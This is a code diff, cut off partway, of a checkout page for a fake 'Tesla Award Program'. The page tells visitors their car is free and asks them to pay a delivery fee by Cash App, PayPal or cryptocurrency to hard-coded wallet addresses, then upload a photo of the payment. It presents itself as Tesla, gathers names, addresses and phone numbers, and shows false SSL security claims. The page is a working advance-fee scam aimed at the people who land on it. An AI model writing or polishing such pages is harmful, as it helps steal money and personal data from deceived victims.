@@ -3,214 +3,701 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Complete Payment | Tesla Award Program 2026</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <title>Payment Details — Tesla Award Program</title>
+  <meta name="description" content="Complete your payment for your Tesla vehicle delivery. View payment instructions, upload proof of payment, and finalize your order.">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://joshbond123.github.io/Tesla/payment.html">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Payment Details — Tesla Award Program">
+  <meta property="og:description" content="Complete your payment for your Tesla vehicle delivery.">
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/style.css">
   <style>
-    body{background:var(--light);}
-    .page-wrap{max-width:680px;margin:0 auto;padding:88px 24px 64px;}
-    .page-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.09);border:1.5px solid rgba(0,0,0,.05);padding:48px;}
-    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
-    .page-title{font-size:26px;font-weight:800;color:var(--dark);text-align:center;margin-bottom:8px;}
-    .page-sub{font-size:15px;color:var(--gray-2);text-align:center;line-height:1.65;margin-bottom:32px;}
+    :root {
+      --success: #00A550;
+      --warning: #F59E0B;
+      --danger: #EF4444;
+      --info: #3B82F6;
+      --pay-border: #E5E7EB;
+      --pay-radius: 16px;
+      --pay-shadow: 0 4px 12px rgba(0,0,0,0.07);
+      --pay-shadow-lg: 0 12px 40px rgba(0,0,0,0.1);
+    }
+    * { box-sizing: border-box; }
+    body{background:#f5f5f7;font-family:'Inter',-apple-system,sans-serif;color:#171A20;}
 
-    .crumbs{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--gray-2);margin-bottom:32px;justify-content:center;flex-wrap:wrap;}
-    .crumb-done{color:var(--success);font-weight:600;}
-    .crumb-active{color:var(--red);font-weight:700;}
-    .crumb-sep{color:var(--border);}
+    .page-wrap{max-width:820px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:var(--pay-radius);box-shadow:var(--pay-shadow);border:1px solid var(--pay-border);padding:48px;}
+    @media(max-width:560px){.page-card{padding:24px 16px;border-radius:14px;}}
 
-    /* Order summary */
-    .order-box{background:var(--light);border-radius:16px;padding:20px 24px;margin-bottom:28px;}
-    .order-box-title{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:12px;}
-    .order-row{display:flex;justify-content:space-between;align-items:center;font-size:14px;padding:6px 0;}
-    .order-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
-    .order-label{color:var(--gray-2);}
-    .order-value{color:var(--dark);font-weight:600;}
-    .order-total{font-size:18px;font-weight:800;color:var(--red);}
-    .order-free{font-size:18px;font-weight:800;color:var(--success);}
+    .page-title{font-size:28px;font-weight:900;color:#111;text-align:center;margin-bottom:4px;letter-spacing:-0.5px;}
+    .page-sub{font-size:15px;color:#666;text-align:center;line-height:1.65;margin-bottom:32px;}
 
-    /* Payment cards */
-    .pay-card{border-radius:16px;border:2px solid var(--border);padding:22px 24px;cursor:pointer;transition:all var(--transition);margin-bottom:14px;display:flex;align-items:center;gap:18px;position:relative;overflow:hidden;}
-    .pay-card:hover{border-color:rgba(227,25,55,.35);box-shadow:var(--shadow-md);transform:translateY(-2px);}
-    .pay-card.selected{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,25,55,.12);}
-    .pay-card.selected::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--red);}
-    .pay-logo{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;}
-    .pay-logo-paypal{background:#003087;}
-    .pay-logo-cashapp{background:#00D632;}
-    .pay-logo-crypto{background:linear-gradient(135deg,#F7931A,#FFBA00);}
-    .pay-info{flex:1;}
-    .pay-name{font-size:16px;font-weight:700;color:var(--dark);margin-bottom:2px;}
-    .pay-desc{font-size:13px;color:var(--gray-2);}
-    .pay-check{width:26px;height:26px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;transition:all var(--transition);flex-shrink:0;}
-    .pay-card.selected .pay-check{background:var(--red);border-color:var(--red);color:white;}
+    /* Steps indicator */
+    .steps-bar{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:36px;flex-wrap:wrap;}
+    .s-step{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:#999;}
+    .s-step.done{color:var(--success);}
+    .s-step.active{color:#E31937;}
+    .s-circle{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;background:#eee;color:#999;}
+    .s-step.done .s-circle{background:var(--success);color:#fff;}
+    .s-step.active .s-circle{background:#E31937;color:#fff;}
+    .s-line{width:32px;height:2px;background:#eee;flex-shrink:0;}
+    .s-line.done{background:var(--success);}
 
-    /* Security note */
-    .security-row{display:flex;align-items:center;gap:8px;justify-content:center;margin:20px 0 0;font-size:12px;color:var(--gray-2);}
+    /* Order Summary */
+    .summary-section{background:#f8f9fa;border-radius:14px;padding:24px 28px;margin-bottom:24px;border:1px solid rgba(0,0,0,.04);}
+    .summary-section h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:16px;}
+    .summary-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(0,0,0,.04);font-size:14px;}
+    .summary-row:last-child{border-bottom:none;}
+    .s-label{color:#777;}.s-value{color:#111;font-weight:600;text-align:right;}
+    .s-total{border-top:2px solid #ddd;padding-top:12px;margin-top:4px;}
+    .s-total .s-label{font-weight:700;color:#111;font-size:15px;}
+    .s-total .s-value{font-weight:900;color:#E31937;font-size:22px;}
 
-    /* Premium loader used from app.js */
+    /* Selected Payment Method Detail */
+    .pay-detail-card{
+      background:white;border-radius:14px;border:1.5px solid rgba(227,25,55,.15);padding:24px;
+      margin-bottom:24px;box-shadow:0 2px 12px rgba(227,25,55,.06);
+    }
+    .pay-detail-header{display:flex;align-items:center;gap:14px;margin-bottom:16px;}
+    .pay-big-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px;}
+    .pay-big-icon.wallet{background:rgba(0,48,135,.1);}.pay-big-icon.crypto{background:rgba(247,147,26,.1);}.pay-big-icon.card{background:rgba(59,130,246,.1);}.pay-big-icon.gift{background:rgba(239,68,68,.1);}
+    .pay-detail-title{font-size:18px;font-weight:800;color:#111;}
+    .pay-detail-sub{font-size:12px;color:#888;}
+
+    .wallet-address-box{
+      background:#f8f9fa;border:1px solid var(--pay-border);border-radius:12px;
+      padding:16px;display:flex;align-items:center;gap:12px;margin-bottom:16px;
+      word-break:break-all;font-family:'Courier New',monospace;font-size:13px;color:#333;
+    }
+    .wallet-address-box .copy-btn{
+      flex-shrink:0;background:#E31937;color:white;border:none;border-radius:8px;
+      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;
+      white-space:nowrap;font-family:inherit;
+    }
+    .wallet-address-box .copy-btn:hover{background:#c41030;}
+    .wallet-address-box .copy-btn.copied{background:var(--success);}
+
+    .qr-placeholder{
+      width:160px;height:160px;background:#f8f9fa;border-radius:12px;
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 16px;border:2px dashed var(--pay-border);
+      font-size:48px;color:#ccc;
+    }
+    .qr-placeholder img{width:100%;height:100%;object-fit:contain;border-radius:10px;}
+
+    .instructions-box{
+      background:#FFF8F0;border:1px solid rgba(245,158,11,.2);border-radius:12px;
+      padding:16px 20px;font-size:14px;color:#92400E;line-height:1.7;margin-bottom:16px;
+    }
+    .instructions-box strong{color:#111;}
+
+    /* Payment Proof Upload */
+    .upload-area{
+      border:2px dashed var(--pay-border);border-radius:14px;padding:32px;
+      text-align:center;cursor:pointer;transition:all .25s;margin-bottom:20px;
+      background:#FAFBFC;
+    }
+    .upload-area:hover{border-color:#E31937;background:rgba(227,25,55,.03);}
+    .upload-area.dragover{border-color:#E31937;background:rgba(227,25,55,.06);}
+    .upload-area.has-file{border-color:var(--success);background:rgba(0,165,80,.04);}
+    .upload-icon{font-size:48px;margin-bottom:12px;opacity:.5;}
+    .upload-title{font-size:16px;font-weight:700;color:#111;margin-bottom:4px;}
+    .upload-hint{font-size:13px;color:#888;margin-bottom:16px;}
+    .upload-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+    .upload-btn{
+      display:inline-flex;align-items:center;gap:8px;padding:10px 22px;
+      border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;
+      border:1.5px solid var(--pay-border);background:white;color:#555;
+      transition:all .2s;font-family:inherit;
+    }
+    .upload-btn:hover{border-color:#E31937;color:#E31937;background:rgba(227,25,55,.04);}
+    .upload-btn.primary{background:#E31937;color:white;border-color:#E31937;}
+    .upload-btn.primary:hover{background:#c41030;}
+    .upload-preview{display:none;margin-top:16px;}
+    .upload-preview.show{display:block;}
+    .upload-preview img{max-width:100%;max-height:200px;border-radius:10px;box-shadow:0 2px 12px rgba(0,0,0,.1);}
+    .upload-preview .file-name{font-size:13px;color:#555;margin-top:8px;font-weight:600;}
+    .upload-preview .file-size{font-size:11px;color:#999;}
+
+    /* Other payment methods */
+    .other-methods{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:24px;}
+    .other-method-card{
+      background:white;border:1.5px solid var(--pay-border);border-radius:12px;
+      padding:14px;text-align:center;cursor:pointer;transition:all .2s;
+    }
+    .other-method-card:hover{border-color:rgba(227,25,55,.3);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.06);}
+    .other-method-card.selected{border-color:#E31937;background:rgba(227,25,55,.04);}
+    .other-method-card .om-icon{font-size:28px;margin-bottom:6px;}
+    .other-method-card .om-name{font-size:13px;font-weight:700;color:#111;}
+    .other-method-card .om-badge{
+      display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;
+      border-radius:999px;margin-top:4px;
+    }
+    .other-method-card .om-badge.selected-badge{background:#E31937;color:#fff;}
+    .other-method-card .om-badge.disabled-badge{background:#eee;color:#999;}
+
+    /* Notification toggle for admin */
+    .notif-bar{
+      display:flex;align-items:center;justify-content:space-between;
+      background:#f0f7ff;border:1px solid rgba(59,130,246,.15);border-radius:12px;
+      padding:14px 18px;margin-bottom:20px;
+    }
+    .notif-bar .notif-text{font-size:13px;color:var(--info);font-weight:600;}
+    .notif-bar .notif-btn{
+      background:var(--info);color:white;border:none;border-radius:8px;
+      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;
+      transition:all .2s;font-family:inherit;
+    }
+    .notif-bar .notif-btn:hover{background:#2563EB;}
+    .notif-bar .notif-btn.subscribed{background:var(--success);}
+
+    .security-row{display:flex;align-items:center;gap:8px;justify-content:center;margin-top:20px;font-size:12px;color:#999;}
+
+    @media(max-width:560px){
+      .page-title{font-size:22px;}.page-sub{font-size:14px;}
+      .wallet-address-box{flex-direction:column;align-items:stretch;}
+      .upload-actions{flex-direction:column;align-items:stretch;}
+      .other-methods{grid-template-columns:repeat(2,1fr);}
+      .steps-bar{gap:4px;}.s-line{width:16px;}
+    }
+
+    /* Modal */
+    .modal-overlay{position:fixed;inset:0;z-index:99998;background:rgba(23,26,32,.6);display:flex;align-items:center;justify-content:center;animation:fadeIn .15s ease;backdrop-filter:blur(4px);padding:20px;}
+    .modal-card{background:white;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.2);padding:32px 28px;max-width:440px;width:100%;animation:modalIn .2s ease;text-align:center;}
+    .modal-card h3{font-size:18px;font-weight:800;color:#111;margin:0 0 6px;}
+    .modal-card p{font-size:14px;color:#666;margin:0 0 20px;line-height:1.6;}
+    .modal-card .btn{min-width:120px;}
+    .modal-actions{display:flex;gap:10px;justify-content:center;}
+
+    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+    @keyframes modalIn{from{opacity:0;transform:scale(.95) translateY(10px);}to{opacity:1;transform:scale(1) translateY(0);}}
+    @keyframes slideInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+
+    .btn{display:inline-flex;align-items:center;gap:6px;justify-content:center;font-family:inherit;border:none;cursor:pointer;font-weight:600;transition:all .22s ease;border-radius:10px;font-size:14px;padding:12px 24px;white-space:nowrap;}
+    .btn-primary{background:#E31937;color:white;}.btn-primary:hover{background:#b5102a;box-shadow:0 8px 28px rgba(227,25,55,.32);}
+    .btn-ghost{background:transparent;color:#555;border:1.5px solid var(--pay-border);}.btn-ghost:hover{background:rgba(0,0,0,.03);border-color:#999;}
+    .btn-success{background:var(--success);color:white;}
+    .btn-danger{background:var(--danger);color:white;}
+    .btn-full{width:100%;}
+    .btn-lg{padding:14px 32px;font-size:16px;}
+    .btn-sm{font-size:12px;padding:8px 16px;}
+    .btn:disabled{opacity:.5;cursor:not-allowed;}
   </style>
-  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
 </head>
 <body>
 
 <nav class="nav">
   <div class="nav-inner">
     <a href="index.html" class="nav-logo">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="var(--red)"><path d="M0 128C189 44 406 0 640 0s451 44 640 128l-38 74C1054 123 851 80 640 80S226 123 38 202L0 128Z"/><path d="M57 235c156-68 353-109 583-109s427 41 583 109c-44 58-102 101-174 130-9-38-25-68-48-90-55-51-159-76-312-76h-51L640 1280 459 199h-51c-153 0-257 25-312 76-23 22-39 52-48 90-72-29-130-72-174-130Z"/></svg>
       TESLA
     </a>
-    <a href="delivery-method.html" class="btn btn-ghost" style="font-size:14px;">← Back</a>
+    <div style="display:flex;align-items:center;gap:12px;">
+      <span style="font-size:12px;color:#888;">Step 4 of 4</span>
+      <a href="delivery-method.html" class="btn btn-ghost btn-sm">← Back</a>
+    </div>
   </div>
 </nav>
 
 <div class="page-wrap">
-  <div class="crumbs">
-    <span class="crumb-done">✓ Verified</span><span class="crumb-sep">›</span>
-    <span class="crumb-done">✓ Vehicle</span><span class="crumb-sep">›</span>
-    <span class="crumb-done">✓ Delivery Details</span><span class="crumb-sep">›</span>
-    <span class="crumb-done">✓ Delivery Method</span><span class="crumb-sep">›</span>
-    <span class="crumb-active">Payment</span>
-  </div>
-
   <div class="page-card anim-fade-up">
-    <h1 class="page-title">💳 Complete Your Order</h1>
-    <p class="page-sub">Pay the delivery fee to finalise your Tesla order. Select your preferred payment method below.</p>
 
-    <!-- Order summary -->
-    <div class="order-box">
-      <div class="order-box-title">Order Summary</div>
-      <div class="order-row">
-        <span class="order-label">Tesla Vehicle</span>
-        <span class="order-free">FREE 🎉</span>
-      </div>
-      <div class="order-row">
-        <span class="order-label">Vehicle Value</span>
-        <span class="order-value" id="vehicleValue">—</span>
-      </div>
-      <div class="order-row">
-        <span class="order-label">Delivery Method</span>
-        <span class="order-value" id="deliveryMethodName">—</span>
-      </div>
-      <div class="order-row">
-        <span class="order-label">Delivery Timeframe</span>
-        <span class="order-value" id="deliveryDays">—</span>
-      </div>
-      <div class="order-row" style="border-top:2px solid var(--border);margin-top:4px;padding-top:12px;">
-        <span class="order-label" style="font-weight:700;color:var(--dark);">Total Due Today</span>
-        <span class="order-total" id="totalDue">—</span>
+    <!-- Steps -->
+    <div class="steps-bar">
+      <div class="s-step done"><span class="s-circle">✓</span> Select Car</div>
+      <div class="s-line done"></div>
+      <div class="s-step done"><span class="s-circle">✓</span> Delivery</div>
+      <div class="s-line done"></div>
+      <div class="s-step done"><span class="s-circle">✓</span> Method</div>
+      <div class="s-line done"></div>
+      <div class="s-step active"><span class="s-circle">4</span> Payment</div>
+    </div>
+
+    <h1 class="page-title">💳 Complete Payment</h1>
+    <p class="page-sub">Review your order, select a payment method, send the delivery fee, and upload your payment proof.</p>
+
+    <!-- Order Summary -->
+    <div class="summary-section">
+      <h3>📋 Order Summary</h3>
+      <div class="summary-row"><span class="s-label">Tesla Model</span><span class="s-value" id="smModel">—</span></div>
+      <div class="summary-row"><span class="s-label">Delivery Method</span><span class="s-value" id="smMethod">—</span></div>
+      <div class="summary-row"><span class="s-label">Delivery Time</span><span class="s-value" id="smTime">—</span></div>
+      <div class="summary-row"><span class="s-label">Customer</span><span class="s-value" id="smName">—</span></div>
+      <div class="summary-row"><span class="s-label">Address</span><span class="s-value" id="smAddr" style="font-size:13px;">—</span></div>
+      <div class="summary-row"><span class="s-label">Phone</span><span class="s-value" id="smPhone">—</span></div>
+      <div class="summary-row s-total"><span class="s-label">Delivery Fee Due</span><span class="s-value" id="smTotal">—</span></div>
+    </div>
+
+    <!-- Select Payment Method -->
+    <div style="margin-bottom:16px;">
+      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">Select Payment Method</div>
+      <div class="other-methods" id="paymentMethodsList">
+        <div style="grid-column:1/-1;text-align:center;padding:20px;color:#999;">Loading payment methods...</div>
       </div>
     </div>
 
-    <!-- Payment methods -->
-    <div style="margin-bottom:8px;font-size:13px;font-weight:700;color:var(--dark);text-transform:uppercase;letter-spacing:.05em;">Select Payment Method</div>
+    <!-- Payment Method Details -->
+    <div id="paymentDetailSection" style="display:none;">
+      <div class="pay-detail-card">
+        <div class="pay-detail-header">
+          <div class="pay-big-icon wallet" id="pmBigIcon">💳</div>
+          <div>
+            <div class="pay-detail-title" id="pmDetailTitle">Payment Method</div>
+            <div class="pay-detail-sub" id="pmDetailType">Wallet</div>
+          </div>
+        </div>
 
-    <div class="pay-card" id="pay-paypal" onclick="selectPayment('paypal')">
-      <div class="pay-logo pay-logo-paypal">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M7.144 19.532l1.049-5.751c.11-.606.67-1.031 1.284-.999 2.818.143 5.296-.236 6.785-2.018 1.053-1.263 1.35-3.078.9-5.31C16.613 3.507 14.413 3 12.294 3H5.573c-.623 0-1.148.452-1.257 1.067L2.07 17.536c-.072.4.237.771.644.771h3.27l1.16-6.373v7.598z"/><path d="M19.428 8.454c-.048 3.266-1.967 5.474-5.52 6.054-.398.065-.801.097-1.207.097h-2.12l-1.16 6.373H6.17l-.666 3.651c-.068.374.222.721.603.721h3.29l1.075-5.922h2.127c4.386 0 7.127-2.268 7.67-6.43a5.29 5.29 0 00-.841-4.544z" opacity=".6"/></svg>
+        <div id="walletAddressBox" style="display:none;">
+          <div style="font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Send Payment To</div>
+          <div class="wallet-address-box">
+            <span id="walletAddress" style="flex:1;">—</span>
+            <button class="copy-btn" id="copyAddressBtn" onclick="copyAddress()">📋 Copy</button>
+          </div>
+        </div>
+
+        <div id="qrContainer" style="display:none;">
+          <div class="qr-placeholder" id="qrPlaceholder">
+            <span id="qrEmoji">📱</span>
+          </div>
+          <div style="text-align:center;margin-bottom:16px;">
+            <div id="qrNote" style="font-size:12px;color:#888;">Scan QR code with your payment app</div>
+          </div>
+        </div>
+
+        <div class="instructions-box" id="instructionsBox">
+          <strong>📌 Payment Instructions:</strong><br>
+          <span id="paymentInstructions">Send the exact delivery fee amount to the provided address. Include your Order ID (shown below) in the payment reference so we can match your payment.</span>
+        </div>
+
+        <div style="background:rgba(227,25,55,.04);border:1px solid rgba(227,25,55,.1);border-radius:10px;padding:12px 16px;font-size:12px;color:#E31937;text-align:center;">
+          ⚡ After sending payment, upload your payment proof below using the file upload or camera option.
+        </div>
       </div>
-      <div class="pay-info">
-        <div class="pay-name">PayPal</div>
-        <div class="pay-desc">Pay securely using your PayPal account or linked card</div>
+
+      <!-- Upload Payment Proof -->
+      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">📎 Upload Payment Proof</div>
+
+      <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
+        <div id="uploadState">
+          <div class="upload-icon" id="uploadIcon">📤</div>
+          <div class="upload-title" id="uploadTitle">Upload Payment Receipt</div>
+          <div class="upload-hint" id="uploadHint">Upload a screenshot or photo of your payment confirmation</div>
+          <div class="upload-actions">
+            <button class="upload-btn" onclick="event.stopPropagation();openCamera()">📷 Take Photo</button>
+            <button class="upload-btn primary" onclick="event.stopPropagation();document.getElementById('fileInput').click()">📁 Browse Files</button>
+          </div>
+        </div>
+        <div class="upload-preview" id="uploadPreview">
+          <img id="previewImage" src="" alt="Payment proof preview">
+          <div class="file-name" id="previewFileName"></div>
+          <div class="file-size" id="previewFileSize"></div>
+          <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;">
+            <button class="btn btn-success btn-sm" id="confirmUploadBtn" onclick="confirmUpload()">✓ Confirm & Submit</button>
+            <button class="btn btn-ghost btn-sm" onclick="resetUpload()">Remove</button>
+          </div>
+        </div>
       </div>
-      <div class="pay-check" id="pcheck-paypal">✓</div>
+
+      <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="handleFileSelect(this)">
+      <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none" onchange="handleFileSelect(this)">
+
+      <div id="uploadStatus" style="display:none;padding:14px;border-radius:10px;margin-bottom:20px;font-size:14px;font-weight:600;text-align:center;"></div>
+
+      <button class="btn btn-primary btn-full btn-lg" id="submitBtn" disabled style="opacity:.5;cursor:not-allowed;" onclick="submitPayment()">
+        🔒 Confirm & Complete Order
+      </button>
+
+      <div class="security-row">
+        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        256-bit SSL Encryption · Your payment proof is securely uploaded
+      </div>
     </div>
 
-    <div class="pay-card" id="pay-cashapp" onclick="selectPayment('cashapp')">
-      <div class="pay-logo pay-logo-cashapp">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm.5 14.5v1h-1v-1.03C9.92 16.24 9 15.18 9 14h1.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5c0-.74-.51-1.3-1.25-1.47l-1.25-.3C9.86 11.93 9 11.03 9 10c0-1.3.96-2.34 2.5-2.47V6.5h1v1.03c1.58.24 2.5 1.3 2.5 2.47H13.5c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5c0 .74.51 1.3 1.25 1.47l1.25.3C14.14 12.07 15 12.97 15 14c0 1.3-.96 2.34-2.5 2.5z"/></svg>
-      </div>
-      <div class="pay-info">
-        <div class="pay-name">Cash App</div>
-        <div class="pay-desc">Pay instantly using your Cash App balance or linked debit card</div>
-      </div>
-      <div class="pay-check" id="pcheck-cashapp">✓</div>
-    </div>
-
-    <div class="pay-card" id="pay-crypto" onclick="selectPayment('crypto')">
-      <div class="pay-logo pay-logo-crypto">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M11.5 2a9.5 9.5 0 100 19A9.5 9.5 0 0011.5 2zm1.13 13.38c-.12.53-.47.88-1 1.02V17.5h-1v-1.06c-.75-.13-1.4-.57-1.63-1.25l1.15-.46c.12.37.5.68.96.68.57 0 1-.43 1-1 0-.5-.37-.84-.91-.97l-.69-.16c-.88-.21-1.47-.88-1.47-1.78 0-.9.57-1.56 1.59-1.75V9.5h1v1.06c.71.14 1.22.55 1.43 1.13l-1.1.44c-.1-.3-.36-.53-.72-.53-.5 0-.87.37-.87.87 0 .46.31.75.82.88l.72.17c.95.22 1.56.9 1.56 1.85 0 .32-.06.63-.17.91z"/></svg>
-      </div>
-      <div class="pay-info">
-        <div class="pay-name">Cryptocurrency</div>
-        <div class="pay-desc">Pay with Bitcoin, Ethereum, USDT, or other major crypto assets</div>
-      </div>
-      <div class="pay-check" id="pcheck-crypto">✓</div>
-    </div>
-
-    <button class="btn btn-primary btn-full btn-lg" id="payBtn" onclick="placeOrder()" disabled style="opacity:.45;cursor:not-allowed;margin-top:8px;">
-      🔒 Pay & Place Order
-    </button>
-
-    <div class="security-row">
-      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
-      256-bit SSL Encryption · Secure & Verified Payment
-    </div>
   </div>
 </div>
-
-<!-- Payment processing uses premium showLoading() from app.js -->
 
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
 <script>
-// Load stored data
-const savedCar      = JSON.parse(localStorage.getItem('tesla_selected_car')    || 'null');
-const savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
-const savedMethod   = JSON.parse(localStorage.getItem('tesla_delivery_method')  || 'null');
-const sessionToken  = localStorage.getItem('tesla_session_token') || getSession();
+(function() {
+  'use strict';
 
-if (!savedCar || !savedDelivery || !savedMethod) { window.location.href = 'dashboard.html'; }
+  // ── LOAD ORDER DATA ──
+  var selectedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+  var deliveryDetails = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+  var deliveryMethod = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
+  var sessionToken = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
 
-const carValues = { model3:'$38,990', modely:'$44,990', models:'$74,990', modelx:'$79,990', cybertruck:'$60,990', roadster:'$200,000' };
-
-// Populate summary
-document.getElementById('vehicleValue').textContent = savedCar ? (carValues[savedCar.id] || '—') : '—';
-document.getElementById('deliveryMethodName').textContent = savedMethod ? savedMethod.name : '—';
-document.getElementById('deliveryDays').textContent = savedMethod ? savedMethod.days : '—';
-document.getElementById('totalDue').textContent = savedMethod ? savedMethod.priceDisplay : '—';
-
-// Payment selection
-let selectedPayment = null;
-
-function selectPayment(method) {
-  selectedPayment = method;
-  document.querySelectorAll('.pay-card').forEach(el => el.classList.remove('selected'));
-  document.getElementById(`pay-${method}`).classList.add('selected');
-  const btn = document.getElementById('payBtn');
-  btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer';
-  btn.textContent = `🔒 Pay ${savedMethod?.priceDisplay || ''} & Place Order`;
-}
-
-// Place order
-async function placeOrder() {
-  if (!selectedPayment || !sessionToken) return;
-
-  const paymentNames = { paypal: 'PayPal', cashapp: 'Cash App', crypto: 'Cryptocurrency' };
-  const paymentName = paymentNames[selectedPayment];
-
-  showLoading('Connecting to ' + paymentName + '...');
-
-  try {
-    const result = await apiCall('/order', 'POST', {
-      sessionToken,
-      selectedCar: savedCar,
-      deliveryDetails: savedDelivery,
-      deliveryMethod: savedMethod,
-      paymentMethod: { id: selectedPayment, name: paymentName },
-    });
-
-    localStorage.setItem('tesla_last_order', JSON.stringify(result.order));
-
-    setTimeout(() => {
-      hideLoading();
-      window.location.href = 'order-placed.html';
-    }, 3000);
-
-  } catch (err) {
-    hideLoading();
-    showToast(err.message || 'Payment failed. Please try again.', 'error');
+  if (!selectedCar || !deliveryDetails || !deliveryMethod) {
+    window.location.href = 'dashboard.html';
+    return;
   }
-}
+
+  // ── PAYMENT METHODS ──
+  var paymentMethods = [];
+  var selectedPaymentId = null;
+  var uploadedFileData = null;
+  var uploadedFileName = '';
+
+  function loadPaymentMethods() {
+    var saved = localStorage.getItem('tesla_payment_methods');
+    if (saved) {
+      try { paymentMethods = JSON.parse(saved); } catch(e) {}
+    }
+    // Fallback defaults
+    if (!paymentMethods || paymentMethods.length === 0) {
+      paymentMethods = [
+        { id:'paypal', name:'paypal', display_name:'PayPal', type:'wallet', icon_emoji:'💳', enabled:true, sort_order:1, wallet_address:'', payment_instructions:'Send payment to our PayPal account. Include your Order ID in the notes.' },
+        { id:'cashapp', name:'cashapp', display_name:'Cash App', type:'wallet', icon_emoji:'💵', enabled:true, sort_order:2, wallet_address:'$TeslaAward', payment_instructions:'Send payment to $TeslaAward on Cash App. Include your Order ID.' },
+        { id:'bitcoin', name:'bitcoin', display_name:'Bitcoin (BTC)', type:'crypto', icon_emoji:'₿', enabled:true, sort_order:3, wallet_address:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', payment_instructions:'Send BTC to the wallet address shown. Network fees may apply.' },
+        { id:'ethereum', name:'ethereum', display_name:'Ethereum (ETH)', type:'crypto', icon_emoji:'♦', enabled:true, sort_order:4, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', payment_instructions:'Send ETH to the wallet address shown. Ensure you use the Ethereum network.' },
+        { id:'usdt', name:'usdt', display_name:'USDT (Tether)', type:'crypto', icon_emoji:'💎', enabled:true, sort_order:5, wallet_address:'TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL', payment_instructions:'Send USDT (TRC-20) to the wallet address shown.' },
+        { id:'creditcard', name:'creditcard', display_name:'Credit Card', type:'card', icon_emoji:'🏦', enabled:true, sort_order:6, wallet_address:'', payment_instructions:'Pay securely using your credit or debit card. We accept Visa, Mastercard, and Amex.' },
